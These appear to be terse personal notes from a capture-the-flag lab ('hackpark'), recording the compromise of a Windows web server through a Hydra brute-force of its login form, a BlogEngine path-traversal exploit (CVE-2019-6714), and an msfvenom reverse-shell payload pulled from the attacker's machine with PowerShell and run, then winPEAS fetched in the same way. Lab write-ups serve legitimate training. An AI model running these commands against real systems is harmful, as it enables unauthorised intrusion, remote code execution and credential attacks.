#reverse image search gave name of clown:
	pennywise

#used burp suite to intercept the login page request.
	__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

#adding this to the hydra command:
	hydra -l admin -P ~/Desktop/rockyou.txt <ip> http-post-form '/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'	
	
	*		hydra -l fucksake -P ~/Desktop/rockyou.txt 10.10.176.54 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

#found pass:
	1qaz2wsx

#then i found a CVE-2019-6714 that i can use to get a shell
	uploades the PostView.ascx
	used this command to trigger it:
	http://10.10.176.54/?theme=../../App_Data/files
#used metasploit's multi/handler to get the shell back

#made a payload using msfvenom:
	msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > shell.exe

#started a db on msfconsole using:
	sudo msdb run

#started a python server:
	python -m SimpleHTTPServer 8000

#used the command to get the file in windows machine:
	powershell -c "Invoke-WebRequest -Uri 'http://10.9.252.17:8000/Desktop/THM/hackpark/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

#go over to windows/tmp directory and activated the payload using:
	.\shell.exe

#shell recieved

#used the command 'systeminfo' to enumerate the system

#got winpeas over to the windows machine
	powershell -c "Invoke-WebRequest -Uri 'http://10.9.252.17:8000/Desktop/PEASS/winPEAS/winPEASbat/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.bat'"

#